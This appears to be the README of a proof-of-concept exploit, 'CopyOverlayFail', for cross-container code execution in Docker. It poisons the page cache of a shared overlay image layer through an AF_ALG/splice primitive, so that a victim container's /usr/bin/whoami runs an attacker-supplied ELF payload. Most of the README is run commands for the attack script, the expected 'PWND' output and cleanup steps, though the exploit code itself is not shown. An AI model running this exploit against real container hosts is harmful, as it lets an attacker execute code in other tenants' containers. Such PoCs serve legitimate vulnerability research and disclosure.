# CopyOverlayFail

CopyFail cross-container code execution through shared overlay image-layer page cache.

This PoC uses two containers built from the same Ubuntu image. The attacker poisons cached bytes for a shared executable; the victim later executes the same path and runs the supplied ELF payload.

This is not host escape. The payload runs in the victim container context.

## Run

Build the example ELF payload:

```bash
python3 make_pwnd_payload.py
```

```bash
docker compose up -d --build
docker compose exec victim whoami
docker compose exec attacker python3 /lab/sploit.py /usr/bin/whoami /lab/payload_pwnd.elf
docker compose exec victim whoami
```

Expected:

```text
root
[+] target: /usr/bin/whoami
[+] payload file: /lab/payload_pwnd.elf
[+] payload length: <n> bytes
[+] wrote <n> bytes through AF_ALG/splice page-cache primitive
PWND
```

After poisoning, `victim whoami` runs your payload instead of the real binary.

## Cleanup

```bash
docker compose down --remove-orphans
docker image rm copyoverlayfail-ubuntu:24.04
sudo sync
sudo sh -c 'echo 3 > /proc/sys/vm/drop_caches'
```

Use a disposable VM. The test can poison or corrupt the local Docker image layer/cache for the target binary.
